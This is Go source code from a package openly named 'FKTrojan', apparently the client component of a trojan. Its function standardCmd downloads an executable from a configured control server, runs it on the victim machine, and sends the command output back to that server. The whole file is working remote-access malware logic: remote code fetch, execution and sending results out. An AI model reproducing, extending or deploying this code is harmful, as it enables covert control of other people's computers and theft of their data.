package command_handler_client

import (
	"FKTrojan/common"
	. "FKTrojan/config_client"
	. "FKTrojan/dao"
	"FKTrojan/file_crypto"
	. "FKTrojan/flog"
	"FKTrojan/service_transfer"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"time"
)

func standardCmd(cmd *Command) error {
	if cmd.Md5sum == "" {
		return fmt.Errorf("cmd %+v md5 is null", cmd)
	}
	f, err := file_crypto.FindFile(cmd.Md5sum)
	if err != nil {
		localFile := file_crypto.RandomFile() + "_" + filepath.Base(cmd.Parameters[0])
		err = service_transfer.TransFile(Conf.ServerIp, Conf.TransPort, &Command{
			Code:       CMD_TRANS_S_TO_C,
			CommandID:  cmd.CommandID,
			UID:        cmd.UID,
			Parameters: []string{cmd.Parameters[0], localFile},
			Time:       time.Now(),
		})
		if err != nil {
			return err
		}
		f := file_crypto.FileInfo{}
		f.DecryptPath = localFile
		err = f.Encrypt()
		if err != nil {
			return err
		}
		cmd.Parameters[0] = f.DecryptPath
	} else {
		cmd.Parameters[0] = f.DecryptPath
	}
	defer os.Remove(cmd.Parameters[0])
	cmdString := cmd.StandardCmd()
	stdout, stderr, err := common.RunExe(cmdString)
	Flog.Debugf("run cmd %s, stdout: %s, stderr: %s\n", cmdString, stdout, stderr)
	fromFile := filepath.Join(os.Getenv("temp"), fmt.Sprintf("%s-output.txt", cmd.Hash()))
	if stdout != "" {
		err = ioutil.WriteFile(fromFile, []byte(stdout), 0666)
	} else {
		err = ioutil.WriteFile(fromFile, []byte(fmt.Sprintf("err:%v\r\n errmsg:%s", err, stderr)), 0666)
	}
	if err != nil {
		return err
	}
	func() {
		defer os.Remove(fromFile)
		service_transfer.TransFile(Conf.ServerIp, Conf.TransPort, &Command{
			Code:       CMD_TRANS_C_TO_S,
			CommandID:  cmd.CommandID,
			UID:        cmd.UID,
			Parameters: []string{cmd.Path, fromFile},
			Time:       time.Now(),
		})
	}()
	return err
}
